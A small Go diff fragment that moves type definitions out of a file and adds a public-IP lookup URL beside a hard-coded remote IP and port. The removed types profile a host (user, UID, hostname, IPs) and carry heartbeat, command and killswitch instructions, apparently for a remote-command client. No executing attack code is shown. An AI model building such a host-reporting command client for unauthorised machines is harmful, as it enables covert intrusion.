@@ -15,31 +15,10 @@ import (
 	"time"
 )
 
-type Client struct {
-	Username        string
-	UID             string
-	GID             string
-	OperatingSystem string
-	Hostname        string
-	PublicIP        string
-	LocalIP         string
-}
-
-type Instructions struct {
-	IsHeartbeat  bool
-	IsCommand    bool
-	IsKillswitch bool
-	Message      string
-}
-
-type Response struct {
-	Successful bool
-	Message    string
-}
-
 var (
-	RemoteIP   = "192.168.1.181"
-	RemotePort = "1302"
+	RemoteIP            = "192.168.1.181"
+	RemotePort          = "1302"
+	Remote_IP_Requester = "https://ip.bulgariu.xyz"
 )
 
 func main() {
